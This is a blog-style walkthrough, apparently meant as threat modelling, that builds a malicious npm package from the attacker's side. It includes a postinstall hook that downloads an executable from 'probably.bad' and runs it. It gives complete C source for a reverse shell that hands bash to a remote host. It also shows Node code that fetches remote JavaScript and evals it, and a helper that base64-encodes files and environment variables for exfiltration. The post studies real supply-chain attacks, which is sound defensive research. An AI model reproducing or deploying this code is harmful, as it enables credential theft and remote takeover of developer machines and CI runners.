@@ -1,0 +1,158 @@
+
+What does a malicious package actually look like in practice? We'll walk through some hypothetical exercises to see how malware generally works, and what sort of functions we might expect, from relatively simple and temporary, to complex. Additionally, as we are focused primarily on Javascript for this post, we really need to think about two different threat models: what does in-browser malware look like, and how is that going to differ from on-host malware?
+Attacker Motivations and Mentality
+As we begin this thought experiment, the first thing to consider is what a potential attacker's targets and goals would be. We'll focus on NPM specifically in this article, primarily because it gives a good survey of several platforms (in-browser vs on-system) with differing threat models, but the general process, methodologies, and concerns remain the same across other platforms, languages, and ecosystems.
+On-Host
+The whole concept of "on-host" malware in NPM packages seems a bit unintuitive at first blush, as the immediate association is generally with browser-focused concerns - which must be safe, since the run in the browser sandbox. In reality, however, on-host https://arxiv.org/abs/2005.09535 is actually where most observed Javascript malware runs. There are, interestingly enough, some serious advantages from an attacker's perspective in running there, rather than in an end user's web browser:
+
+If we run outside of a browser, we have the same level of access as the developer installing our package.
+Running within a large, mainstream package in an end-user's browser increases our odds of being discovered - many more products and users are observing package behavior at the endpoint than during the build process.
+To add to the last point, many security products actually ignore things like devDependencies entirely, and many of the infrastructure pieces, such as CI builders, where build-related code will run on has little-to-nothing in terms of security measures and mitigations.
+While this certainly doesn't mean we are restricted to operating on-host (as we'll see later, there is plenty we can do in-browser), this makes it a very compelling place to begin our journey. As such, we'll walk through an iterative process of making our badware package, and applying some gradual improvements.
+Crawl
+To start the project off, we'll build a simple npm package. What exactly it will do, or what value it will provide is largely irrelevant; for argument's sake, it might change the console font color, or include some pictures of cats, but in practice, it simply exists to bundle in our malware.
+In order for our malware to be even moderately successful, we need three elements:
+
+To gain execution.
+Network access.
+To ensure the user remains unaware that we are running.
+To get what we might consider the most basic form of item one, we'll take a page from some prior work and leverage a great feature of our javascript tooling - the postinstall script. To that end, we'll start with our package.json:
+{
+    "name": "mostly-harmless",
+    "version": "1.0.0",
+    /* ... */
+    "scripts": {
+        "postinstall": "wget https://probably.bad/malware && chmod +x malware && ./malware &"
+    }
+}
+and (for now, at least) we won't make our malware too complex, perhaps we'll simply start with something like the following:
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+
+int main(int argc, char** argv)
+{
+    struct sockaddr_in addr = {0};
+	unsigned short     port = 1028;
+	const char*        netaddr = "10.0.0.20";
+	int                sock = -1;
+
+	addr.sin_family = AF_INET;
+	addr.sin_port = htons(port);
+	if(0 == inet_aton(netaddr, &addr.sin_addr)) {
+		return 0;
+	}
+    
+	if(-1 == (sock = socket(AF_INET, SOCK_STREAM, 0))) {
+		return 0;
+	}
+
+	if(connect(sock, (struct sockaddr*)&addr, sizeof(addr))) {
+		goto Cleanup;
+	}
+    
+    if(-1 == dup2(sock, STDOUT_FILENO)) {
+		goto Cleanup;
+	}
+
+	if(-1 == dup2(sock, STDIN_FILENO)) {
+		goto Cleanup;
+	}
+
+	if(-1 == dup2(sock, STDERR_FILENO)) {
+		goto Cleanup;
+	}
+	execlp("/bin/bash", "bash", NULL);
+
+Cleanup:
+	close(sock);
+    
+    return 0;
+}
+A small program that will essentially give us a reverse shell - first by opening a socket, connecting to our "remote" server, redirecting stdin/stdout/stderr to our new socket, and then executing bash. From here, we have full console access to the local machine in the same context as the current user (presumably either a developer or a CI runner).
+While this certainly works, and gives us access, it comes with some serious limitations. For one, it's fairly trivial to detect - a simple netstat -an will identify it easily. Another issue is that we have to be ready to accept the connection as soon as the user runs npm install, as it will only try to connect out once, and will die when the current user logs off (barring detached terminals or similar). Finally, it is very overt - not only would most network security devices (IDS or IPS) catch this traffic in-flight, even a casual observer would find this when perusing the package.json.
+Oddly enough, however, the last point (at least, regarding the package.json) is less bad than one might think - while trivial observations would certainly catch it, if our malware is upstream from any non-trivial package installation, manual identification might end up being nearly impossible. In fact, as documented in "The Backstabber's Knife Collection" (linked earlier in the article), this sort of scheme has worked for a large subset of discovered javascript malware. Still, we can almost certainly do better.
+Walk
+Now we have a notional infection vector (via our postinstall script), and some code to give us access to the remote host. Where do we go from here to look at improving our setup? We can draw some inspiration from malware added upstream from which harvested (and shipped off) tokens and credentials from the local system, effectively giving attackers the ability to modify previously-published packages controlled by the current user at a future date.
+While we're actually obtaining credentials here, focusing on a single file with a small number of credentials that may (or may not) be on most of the machines we land on seems a bit lackluster when we can look for other locally stored credentials (e.g., AWS tokens, SSH keys, etc) and environment variables.
+In order to get this new functionality up and running, we can start by making a quick change to our previous package.json:
+{
+    "name": "mostly-harmless",
+    "version": "1.0.1",
+    /* ... */
+    "scripts": {
+        "postinstall": "node ./lib/build.js"
+    }
+}
+Now instead of running our new malware directly in this file, we'll make it slightly stealthier by remote-hosting the file, and pulling it down at runtime. A quick first pass at this might resemble the following:
+try {
+    const https = require("https");
+    https.get({
+        hostname: "probably.bad",
+        path: "/new-malware",
+        headers: {
+            Accept: "text/html"
+        }
+    }, 
+    res => { res.on("data" d => eval(d)); })
+        .on("error", () => {});
+       
+} catch (e) {}
+Interestingly enough, this is actually almost exactly the same as the malware that launched in the aforementioned eslint attack: it would pull the file retrieval script from a remote host (where we've slotted in our hypothetical attack domain, "probably.bad", the original utilized pastebin), and simply eval the text. While this is mostly effective, there is a critical flaw here - if for some reason we don't get the entire script to execute in the first chunk, our eval will likely fail with syntax error, as we might be attempting to execute half a script (for reference, a copy of the original malware with deeper explanation of the attack and constituent parts can be found here), which ended up resulting in the attack being discovered quickly.
+Now certainly the first issue is relatively simple to fix: we need to ensure we've downloaded the full file before we attempt to eval.  To that end, what we probably want is something more like the following:
+try {
+    const https = require("https");
+    https.get("https://probably.bad/new-malware", res => {
+        let tmp = "";
+        res.on("data", d => tmp += d);
+        res.on("end", () => eval(tmp));
+    }).on("error", () => {});
+} catch(e) {}
+This should get us more consistent execution at least, but now to think about what we should be harvesting - are NPM creds or crypto wallets really the best we can do? If we think about this a bit, there are two general contexts under which we will run:
+
+On a developer's system.
+On a CI runner.
+From an attacker's perspective, both places are interesting - albeit for slightly different reasons. In the first case, the answer is somewhat obvious: we are going to be running on a developer's workstation while a project is being built and tested locally. This means that things like credentials (NPM creds, SSH keys, and many more) will likely be available for access and exfiltration, among other things. The second scenario, however, is also interesting - CI runners often get sensitive items such as database credentials, infrastructure keys, and similar injected during the build process. Past experience also shows that some attackers have historically used this opportunity to add backdoors at this stage, infecting other projects on the system.
+Realistically, enumerating files and environment variables will give attackers all of this - providing the proverbial "keys to the kingdom" in terms of access - instead of simply accessing a single file in the user's home directory. There is one lingering concern here, however: the linked malware essentially provided the extracted credentials as part of its GET to the remote server - an exfiltration method that mostly worked in that case due simply to the fact that the data they were retrieving was relatively small, and at least approximating fixed-length. For us, we will very quickly run into issues with this seemingly-small change, as we have now transitioned from extracting small, fixed-length files, to sending back potentially many megabytes of data, spread between a number of files and environment variables, with various types of encoding.
+In order to fix this and allow us to be slightly stealthier (we could spend a lot of time thinking about how to improve this, but such things are beyond the scope of this article), we really need to normalize the encoding and ensure that we are not sending out too much data each time we push contents back to our remote server. To that end, we will start with the following snippet of code:
+// This will contain all of the temporary data we
+// read from files and env vars.
+let exfil = {};
+
+// we will essentially call this function
+// once per item: 
+// name -> the filename or ENV var
+// tp -> either "file" or "env"
+// data -> the raw blob of data
+const process = (name, tp, data) => {
+	exfil = Object.assign(exfil, 
+    {`{name}@{tp}`: Buffer.from(data).toString("base64")});
+};
+Once we've processed all of the data for exfiltration, we can now easily iterate through the object and send back the name/content pairs to a variety of endpoints (perhaps alternating GETs and POSTs), and have at least some variety to our actions. If we wanted to be even stealthier, we might combine all of this together, encrypt the contents, and then send it back in variable sized chunks.
+Where to go Next
+We've now discussed in quite a bit of depth the bare minimum required to bake malware into upstream libraries. However, this is simply the beginning of the discussion - many parts, such as handling persistence (how can we run again after the user logs off the system?), extending our tooling (we probably want to do a little better than our first efforts here), improving our stealthiness, and working around limitations of other platforms are all additional items to consider.
+In short, while we've technically met our stated goals in our first steps toward building a malicious package, there is still much room for improvement.
+Especially noting here that the tactics, techniques, and procedures (TTPs) described were nearly all exhibited by live malware - much of it rapidly convicted. From here, we want to push the boundaries a bit further, and discuss more sophisticated techniques, and as such, we'll dig much further into this topic in follow-on posts.
+devDependencies
+postinstall
+package.json
+netstat -an
+npm install
+package.json
+package.json
+postinstall
+package.json
+eslint
+eval
+GET
+GET
+POST
